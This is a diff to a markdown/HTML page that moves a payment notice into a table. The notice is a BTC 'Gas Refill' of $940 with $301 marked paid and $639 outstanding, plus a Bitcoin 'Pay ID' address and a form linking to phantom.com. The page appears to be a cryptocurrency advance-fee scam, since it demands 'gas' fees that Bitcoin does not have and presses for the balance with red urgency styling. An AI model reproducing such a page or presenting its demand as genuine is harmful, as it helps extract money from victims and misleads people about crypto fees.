@@ -30,11 +30,11 @@ Hash ID:    **8b214f6839d869d6ab80[39Kn3XYPUmrud...qHwnUYg6uvz]**
 <span style="color: Red;"> ***Gas Refill:     0.00976176 BTC [$940 usd]*** </span>
 
 
-<span style="color: Blue;"> **Gas Recevied**    ~~$301 PAID~~ </span> <span style="color: Red;"> ~~$639~~ CURRENTLY OUTSTANDING ⏳ </span>
+| <span style="color: Blue;"> **Gas Recevied**    ~~$301 PAID~~ </span>                  | </span> <span style="color: Red;"> ~~$639~~ CURRENTLY OUTSTANDING ⏳ </span> |
+|---------------------------|---------------------------|
+|  **Pay ID:**              | bc1q08mp7f3wdvpav0fkjy8reun6wtzulrc999jsls |
 
-
- **Pay ID:** bc1q08mp7f3wdvpav0fkjy8reun6wtzulrc999jsls
- <img src="IMG_8518.jpeg" alt="blockchain Logo" width="30" />
+<img src="IMG_8518.jpeg" alt="blockchain Logo" width="30" />
 
 
 <form action="https://phantom.com/" method="get">
